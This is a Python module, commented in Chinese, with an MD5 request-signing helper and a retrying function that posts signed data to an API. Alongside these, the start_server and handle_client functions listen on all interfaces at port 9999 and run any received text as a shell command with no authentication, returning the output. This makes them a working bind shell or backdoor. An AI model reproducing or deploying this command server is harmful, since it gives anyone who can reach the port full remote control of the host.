import socket
import subprocess
import threading
import requests
import hashlib
import time
from constants import SALT, API_URL
from tools import log_with_timestamp

# 生成签名函数
def generate_sign(data: dict, salt: str) -> str:
    sorted_items = sorted(data.items())
    sign_string = "&".join(f"{key}={value}" for key, value in sorted_items)
    sign_string += f"&salt={salt}"
    return hashlib.md5(sign_string.encode('utf-8')).hexdigest()

# 处理客户端请求的函数
def handle_client(client_socket):
    try:
        # 接收客户端发送的命令
        command = client_socket.recv(1024).decode('utf-8')
        log_with_timestamp(f"接收到命令: {command}")

        # 执行命令并返回结果
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = result.stdout + "\n" + result.stderr

        # 发送结果回客户端
        client_socket.send(response.encode('utf-8'))
    except Exception as e:
        client_socket.send(f"Error: {str(e)}".encode('utf-8'))
    finally:
        client_socket.close()

# 服务器交互
def start_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    log_with_timestamp(f"服务端已启动，监听 {host}:{port}...")

    while True:
        client_socket, addr = server_socket.accept()
        log_with_timestamp(f"接收到来自 {addr} 的连接...")
        
        # 创建线程处理客户端请求
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

# 推送数据函数
def push_data(payload: dict, max_retry: int, retry_interval: int):
    retry_count = 0
    success = False

    while retry_count <= max_retry:
        payload['timestamp'] = int(time.time())
        payload['retry'] = retry_count
        payload['sign'] = generate_sign(payload, SALT)

        log_with_timestamp(f"\033[93m推送到地址: {API_URL}\033[0m")

        try:
            response = requests.post(API_URL, json=payload)
            log_with_timestamp(f"\033[93m状态码: {response.status_code}\033[0m")
            log_with_timestamp(f"\033[93m响应内容: {response.text}\033[0m")

            if response.status_code == 200:
                log_with_timestamp("\033[92m推送成功\033[0m")
                success = True
                break
            else:
                log_with_timestamp(f"\033[91m推送失败，状态码: {response.status_code}, 内容: {response.text}\033[0m")
        except requests.RequestException as e:
            log_with_timestamp(f"\033[91m请求异常: {e}\033[0m")

        retry_count += 1
        if retry_count <= max_retry:
            log_with_timestamp(f"\033[93m重试 {retry_count}/{max_retry} 次，等待 {retry_interval} 秒...\033[0m")
            time.sleep(retry_interval)

    if not success:
        log_with_timestamp("\033[91m推送失败，达到最大重传次数。\033[0m")
